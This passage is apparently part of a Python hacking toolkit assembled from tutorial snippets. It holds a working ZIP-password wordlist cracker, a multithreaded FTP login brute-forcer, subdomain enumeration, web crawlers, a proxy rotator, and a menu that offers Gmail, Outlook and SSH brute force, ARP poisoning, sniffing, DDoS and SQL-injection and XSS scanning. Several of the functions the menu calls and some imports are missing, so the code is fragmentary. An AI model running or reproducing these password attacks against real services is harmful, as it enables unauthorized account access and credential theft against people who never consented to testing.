	zip_file = zipfile.ZipFile(zip_file)
	# count the number of words in this wordlist
	n_words = len(list(open(wordlist, "rb")))
	# print the total number of passwords
	print("Total passwords to test:", n_words)
	
	with open(wordlist, "rb") as wordlist:
    		for word in tqdm(wordlist, total=n_words, unit="word"):
        		try:
            			zip_file.extractall(pwd=word.strip())
        		except:
            			continue
        		else:
            			print("[+] Password found:", word.decode().strip())
            			exit(0)
	print("[!] Password not found, try other wordlist.")



import ftplib
from threading import Thread
import queue
from colorama import Fore, init # for fancy colors, nothing else

# init the console for colors (for Windows)
# init()
# initialize the queue
q = queue.Queue()

# port of FTP, aka 21
port = 21

def connect_ftp():
    global q
    while True:
        # get the password from the queue
        password = q.get()
        # initialize the FTP server object
        server = ftplib.FTP()
        print("[!] Trying", password)
        try:
            # tries to connect to FTP server with a timeout of 5
            server.connect(host, port, timeout=5)
            # login using the credentials (user & password)
            server.login(user, password)
        except ftplib.error_perm:
            # login failed, wrong credentials
            pass
        else:
            # correct credentials
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")
            # we found the password, let's clear the queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            # notify the queue that the task is completed for this password
            q.task_done()


def ftpBrute():
    global host
    global user
    # hostname or IP address of the FTP server
    host = input("Host:")
    # username of the FTP server, root as default for linux
    user = input("User:")
    passlist = input("Path wordlist:")
    # number of threads to spawn
    n_threads = int(input("Number of threads:"))
    # read the wordlist of passwords
    passwords = open(passlist).read().split("\n")

    print("[+] Passwords to try:", len(passwords))

    # put all passwords to the queue
    for password in passwords:
        q.put(password)

    # create `n_threads` that runs that function
    for t in range(n_threads):
        thread = Thread(target=connect_ftp)
        # will end when the main thread end
        thread.daemon = True
        thread.start()
    # wait for the queue to be empty
    q.join()
    
    
 
import requests
from threading import Thread, Lock
from queue import Queue

q = Queue()
list_lock = Lock()
discovered_domains = []

def scan_subdomains(domain):
    global q
    while True:
        # get the subdomain from the queue
        subdomain = q.get()
        # scan the subdomain
        url = f"http://{subdomain}.{domain}"
        try:
            requests.get(url)
        except requests.ConnectionError:
            pass
        else:
            print("[+] Discovered subdomain:", url)
            # add the subdomain to the global list
            with list_lock:
                discovered_domains.append(url)

        # we're done with scanning that subdomain
        q.task_done()


def main(domain, n_threads, subdomains):
    global q

    # fill the queue with all the subdomains
    for subdomain in subdomains:
        q.put(subdomain)

    for t in range(n_threads):
        # start all threads
        worker = Thread(target=scan_subdomains, args=(domain,))
        # daemon thread means a thread that will end when the main thread ends
        worker.daemon = True
        worker.start()


def subDomin():
	domain = input("Website :")
	wordlist = input("Sub Domain list:")
	num_threads = int(input("Number of thread:"))
	output_file = input("output_file:")
	main(domain=domain, n_threads=num_threads, subdomains=open(wordlist).read().splitlines())
	q.join()

	# save the file
	with open(output_file, "w") as f:
		for url in discovered_domains:
      			print(url, file=f)
            
            
 
 
 
import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

 
def extract():

	# URL of the web page you want to extract
	url = input("Url >>https://www.wikipedia.org:")

	# initialize a session
	session = requests.Session()
	# set the User-agent as a regular browser
	session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"

	# get the HTML content
	html = session.get(url).content

	# parse HTML using beautiful soup
	soup = bs(html, "html.parser")

	# get the JavaScript files
	script_files = []

	for script in soup.find_all("script"):
    		if script.attrs.get("src"):
        		# if the tag has the attribute 'src'
        		script_url = urljoin(url, script.attrs.get("src"))
        		script_files.append(script_url)

	# get the CSS files
	css_files = []

	for css in soup.find_all("link"):
    		if css.attrs.get("href"):
        		# if the link tag has the 'href' attribute
        		css_url = urljoin(url, css.attrs.get("href"))
        		css_files.append(css_url)


	print("Total script files in the page:", len(script_files))
	print("Total CSS files in the page:", len(css_files))

	# write file links into files
	with open("javascript_files.txt", "w") as f:
    		for js_file in script_files:
        		print(js_file, file=f)

	with open("css_files.txt", "w") as f:
    		for css_file in css_files:
        		print(css_file, file=f)
            
    
    

import whois






def is_registered(domain_name):
    """
    A function that returns a boolean indicating 
    whether a `domain_name` is registered
    """
    try:
        w = whois.whois(domain_name)
    except Exception:
        return False
    else:
        return bool(w.domain_name)

#domain_name = input("url>>>google.com:")


def GetDomain():
	#global no;
	print("1.Get info about specific domain:")	
	print("2.Validate Domain:")
	no=input(":")

	if no=="1":
		domain_name = input("Url:>>google.com:")
		if is_registered(domain_name):
    			whois_info = whois.whois(domain_name)
    			# print the registrar
    			print("Domain registrar:", whois_info.registrar)
    			# print the WHOIS server
    			print("WHOIS server:", whois_info.whois_server)
    			#get the creation time
    			print("Domain creation date:", whois_info.creation_date)
    			# get expiration date
    			print("Expiration date:", whois_info.expiration_date)
    			# print all other info
    			print(whois_info)

	if no =="2":
		domain = input("Url:>>google.com:")
		print(domain, "is registered" if is_registered(domain) else "is not registered")    		








def is_valid(url):
    """
    Checks whether `url` is a valid URL.
    """
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)


def get_all_images(url):
    """
    Returns all image URLs on a single `url`
    """
    soup = bs(requests.get(url).content, "html.parser")
    urls = []
    for img in tqdm(soup.find_all("img"), "Extracting images"):
        img_url = img.attrs.get("src")
        if not img_url:
            # if img does not contain src attribute, just skip
            continue
        # make the URL absolute by joining domain with the URL that is just extracted
        img_url = urljoin(url, img_url)
        # remove URLs like '/hsts-pixel.gif?c=3.2.5'
        try:
            pos = img_url.index("?")
            img_url = img_url[:pos]
        except ValueError:
            pass
        # finally, if the url is valid
        if is_valid(img_url):
            urls.append(img_url)
    return urls


def download(url, pathname):
    """
    Downloads a file given an URL and puts it in the folder `pathname`
    """
    # if path doesn't exist, make that path dir
    if not os.path.isdir(pathname):
        os.makedirs(pathname)
    # download the body of response by chunk, not immediately
    response = requests.get(url, stream=True)

    # get the total file size
    file_size = int(response.headers.get("Content-Length", 0))

    # get the file name
    filename = os.path.join(pathname, url.split("/")[-1])

    # progress bar, changing the unit to bytes instead of iteration (default by tqdm)
    progress = tqdm(response.iter_content(1024), f"Downloading {filename}", total=file_size, unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "wb") as f:
        for data in progress:
            # write data read to the file
            f.write(data)
            # update the progress bar manually
            progress.update(len(data))


def image(url, path):
    # get all images
    imgs = get_all_images(url)
    for img in imgs:
        # for each img, download it
        download(img, path)
    



import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import colorama

# init the colorama module
colorama.init()

GREEN = colorama.Fore.GREEN
GRAY = colorama.Fore.LIGHTBLACK_EX
RESET = colorama.Fore.RESET

# initialize the set of links (unique links)
internal_urls = set()
external_urls = set()

total_urls_visited = 0


def is_valid(url):
    """
    Checks whether `url` is a valid URL.
    """
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)


def get_all_website_links(url):
    """
    Returns all URLs that is found on `url` in which it belongs to the same website
    """
    # all URLs of `url`
    urls = set()
    # domain name of the URL without the protocol
    domain_name = urlparse(url).netloc
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    for a_tag in soup.findAll("a"):
        href = a_tag.attrs.get("href")
        if href == "" or href is None:
            # href empty tag
            continue
        # join the URL if it's relative (not absolute link)
        href = urljoin(url, href)
        parsed_href = urlparse(href)
        # remove URL GET parameters, URL fragments, etc.
        href = parsed_href.scheme + "://" + parsed_href.netloc + parsed_href.path
        if not is_valid(href):
            # not a valid URL
            continue
        if href in internal_urls:
            # already in the set
            continue
        if domain_name not in href:
            # external link
            if href not in external_urls:
                print(f"{GRAY}[!] External link: {href}{RESET}")
                external_urls.add(href)
            continue
        print(f"{GREEN}[*] Internal link: {href}{RESET}")
        urls.add(href)
        internal_urls.add(href)
    return urls


def crawl(url, max_urls=50):
    """
    Crawls a web page and extracts all links.
    You'll find all links in `external_urls` and `internal_urls` global set variables.
    params:
        max_urls (int): number of max urls to crawl, default is 30.
    """
    global total_urls_visited
    total_urls_visited += 1
    links = get_all_website_links(url)
    for link in links:
        if total_urls_visited > max_urls:
            break
        crawl(link, max_urls=max_urls)


def linksPro():
	url =input("url>>https://www.github.com:")
	max_urls=int(input("Max urls-> default 30 :"))
	crawl(url, max_urls=max_urls)
	print("[+] Total Internal links:", len(internal_urls))
	print("[+] Total External links:", len(external_urls))
	print("[+] Total URLs:", len(external_urls) + len(internal_urls))
	domain_name = urlparse(url).netloc
	# save the internal links to a file
	with open(f"{domain_name}_internal_links.txt", "w") as f:
        	for internal_link in internal_urls:
            		print(internal_link.strip(), file=f)

	# save the external links to a file
	with open(f"{domain_name}_external_links.txt", "w") as f:
        	for external_link in external_urls:
            		print(external_link.strip(), file=f)
            		
 


def get_free_proxies():
    url = "https://free-proxy-list.net/"
    # get the HTTP response and construct soup object
    soup = bs(requests.get(url).content, "html.parser")
    proxies = []
    for row in soup.find("table", attrs={"id": "proxylisttable"}).find_all("tr")[1:]:
        tds = row.find_all("td")
        try:
            ip = tds[0].text.strip()
            port = tds[1].text.strip()
            host = f"{ip}:{port}"
            proxies.append(host)
        except IndexError:
            continue
    return proxies


def get_session(proxies):
    # construct an HTTP session
    session = requests.Session()
    # choose one random proxy
    proxy = random.choice(proxies)
    session.proxies = {"http": proxy, "https": proxy}
    return session

def proxy():
	# proxies = get_free_proxies()
	proxies = [
        '167.172.248.53:3128',
        '194.226.34.132:5555',
        '203.202.245.62:80',
        '141.0.70.211:8080',
        '118.69.50.155:80',
        '201.55.164.177:3128',
        '51.15.166.107:3128',
        '91.205.218.64:80',
        '128.199.237.57:8080',
    ]
	print("test1 proxy")    	
	for i in range(5):
		print("test2 proxy")
		s = get_session(proxies)
		try:
			print("test3 proxy ")
			print("Request page with IP:", s.get("http://icanhazip.com", timeout=1.5).text.strip())
		except Exception as e:
			continue
            
        
'''

#If you want IP rotation on Tor, use multiple_tor_proxies.py
import requests
from stem.control import Controller
from stem import Signal

def get_tor_session():
    # initialize a requests Session
    session = requests.Session()
    # setting the proxy of both http & https to the localhost:9050 
    # (Tor service must be installed and started in your machine)
    session.proxies = {"http": "socks5://localhost:9050", "https": "socks5://localhost:9050"}
    return session

def renew_connection():
    with Controller.from_port(port=9051) as c:
        c.authenticate()
        # send NEWNYM signal to establish a new clean connection through the Tor network
        c.signal(Signal.NEWNYM)


if __name__ == "__main__":
    s = get_tor_session()
    ip = s.get("http://icanhazip.com").text
    print("IP:", ip)
    renew_connection()
    s = get_tor_session()
    ip = s.get("http://icanhazip.com").text
    print("IP:", ip)

'''     		
        
os.system('clear')

print("0-Download From Youtube:")
print("1-host/localIP/PublicIp:")
print("2-Trace Route IP's Target:")
print("3-Changing Mac Address:")
print("4-Who Is On My Wifi Network:")
print("5-NetworkSNiffer Http:")
print("6-Arp Positiong:")
print("7-SNiffing Packets TCP/UDP/ICMP")
print("8-Hash MD5/SHA1/SHA2/SHA3/BLACK")
print("9-AES Encryption:")
print("10-Hash Entire File:")
print("11-Encrypt & Decrypt file with Key:")
print("12-Hide Text in image/audio/video:")
print("13-Extract Metadata from image or video:")
print("14-BruteForce any LoginPage:")
print("15-BruteForce Outlook:")
print("16-BruteForce Gmail:")
print("17-Brute SSh Protocol:")
print("18-Brite PDF Protected file:")
print("19-Brute ZIP Protected file:")
print("20-Brute Force FTP service:")
print("21-Connect on SSh  And Exceute Command Remotely :")
print("22-Connect Bot on SSH:")
print("23-Retrevie-Bannel Vulnerability:")
print("24-Retrevie Information about given IP:")
print("25-DNS zone Transfer Target:")
print("26-Find SubDomains in Target Website")
print("27-Fast SubDomain Discover:")
print("28-Find DisAllow GoogleBot :")
print("29- Find Status code 200 in any website:")
print("30-Scrapping Emails on Specific Target:")
print("31-Fast Port Scanning Target:")
print("32-DDOS Attack :")
print("33-check Url vulnerable SQl :")
print("34-Check Url xss vulnerability :")
print("35-Extract css/js files:")
print("36-Extract links:")
print("37-Get information about Domain:")
print("38-Downliad image from website:")

print("40-Needed cusimtize code Scraping Proxy ip or use Random:")
print("41-Proxy Ip rotation on Tor (Under work):")




Num=input(": ")
if(Num=="0"):
	DownloadYou()	 
elif(Num=="1"):
	urIp()	
elif(Num=="2"):
	TraceRoute()
elif(Num=="3"):
	 ChangeMac()
elif(Num=="4"):
	ip = input("Enter IP & Prefix :")
	scanDiscover(ip)
elif(Num=="5"):
	sniffer('eth0')	
elif(Num=="6"):
	Arp()
elif(Num=="7"):
	print("************ STARTED ***************")
	sniff(iface="eth0",prn=analyzer)
elif(Num=="8"):
	hashing()

elif(Num=="9"):
	password = input("Enter encryption password: ")
	#print(Num)	
	#First let us encrypt secret message
	word=input("Enter Sentence:")
	encrypted = encrypt(word, password)
	print(encrypted)
	# Let us decrypt using our original password
	decrypted = decrypt(encrypted, password)
	print(bytes.decode(decrypted))

elif(Num=="10"):
	hasfile()
elif(Num=="11"):
	Sysmatric()
elif(Num=="12"):
	stegraphy()

elif(Num=="13"):
	exif()


elif(Num=="14"):

	print("Test on http://192.168.1.90/dvwa/login.php")
	page_url = "http://192.168.1.90/dvwa/login.php"
	username = input("Enter Username FOr specify Page:")
	with open("rockyou.txt","r") as passwods:
		bruteforce(username,page_url)
	print("[!!] Password Is Not In This List")	
elif(Num=="15"):
	BruteOutlook()
elif(Num=="16"):
	BruteGmail()
elif(Num=="17"):
	sshBrute() 
elif(Num=="18"):
	pdf()
elif(Num=="19"):
	zipf()
elif(Num=="20"):
	ftpBrute() 
elif(Num=="21"):
	RemotelySSH()
elif(Num=="22"):
	#add_bot('192.168.1.90', 'msfadmin', 'msfadmin')
	#command_bots('ls')
	print(16)
elif(Num=="23"):
	start()
elif(Num=="24"):
	ip = input("Enter IP :")
	LocIP(ip)
	
elif(Num=="25"):
	DNSLOOKUP()
elif(Num=="26"):
	subDomain()
elif(Num=="27"):
	subDomin()
elif(Num=="28"):
	Robot()	
elif(Num=="29"):
	dirbustor()
elif(Num=="30"):
	Scapping()
elif(Num=="31"):
	infoscan()
elif(Num=="32"):
	ddos()	
elif(Num=="33"):
	url = input(":") 
	#http://testphp.vulnweb.com/artists.php?artist=1
	scan_sql_injection(url)	

elif(Num=="34"):
	url=input(":")	
	print(scan_xss(url))


elif(Num=="35"):
	extract()
elif(Num=="36"):
	linksPro()   	
elif(Num=="37"):	
	GetDomain()
elif(Num=="38"):
	url = input("url:")
	path = input("path outfile file save/Enter to defualt:")
	if not path:
		# if path isn't specified, use the domain name of that url as the folder name
		path = urlparse(url).netloc
	image(url, path)
	
	

elif(Num=="40"):
	proxy()	
elif(Num=="41"):
	print("Under work...")	
else:
	print("Out of Index")											
	 



  

